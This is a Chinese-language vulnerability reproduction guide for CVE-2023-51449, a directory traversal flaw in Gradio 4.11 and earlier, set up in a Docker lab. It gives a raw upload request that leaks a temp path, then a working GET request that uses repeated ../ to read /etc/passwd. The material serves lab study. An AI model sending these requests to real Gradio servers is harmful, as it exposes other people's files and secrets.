# Gradio `file` 目录遍历漏洞（CVE-2023-51449）

Gradio 是一个用于创建机器学习模型交互式界面的 Python 库，通过 Gradio，可以快速地为模型构建一个可视化的、易于使用的 Web 界面，无需编写任何前端代码。

Gradio 4.11 及以下版本，在未启用身份验证时如果知道要查找的文件路径，就可以使用公共 URL 访问运行 Gradio 应用程序的机器上的任意文件（例如，如果演示是使用 `share=True` 创建的，或者在 Hugging Face Spaces 上创建的）。

参考链接：

+ https://github.com/gradio-app/gradio/pull/6833

+ https://github.com/gradio-app/gradio/tree/gradio%404.10.0

## 环境启动

执行如下命令启动 Gradio 环境：

```
docker compose up -d
```

启动成功后访问，默认没有身份验证。

```
http://your-ip:7860
```

## 漏洞复现

使用 upload 接口随便上传一段内容，需要获取到一个可访问的文件路径。

```
POST /upload HTTP/1.1
Host: localhost:7860
Content-Type: multipart/form-data; boundary=---------------------------250033711231076532771336998311

-----------------------------250033711231076532771336998311
Content-Disposition: form-data; name="files";filename="okmijnuhbygv"
Content-Type: application/octet-stream

123456
-----------------------------250033711231076532771336998311--


```

![image-20250424134122049](1.png)

得到一个可访问的文件路径后使用 file 接口访问并使用目录遍历读取文件，即可成功读取。

```
GET /file=/tmp/gradio/7c4a8d09ca3762af61e59520943dc26494f8941b/../../../../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: localhost:7860
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36 Edg/100.0.1185.36
Connection: close
Accept-Encoding: gzip
```

![image-20250424134351720](2.png)

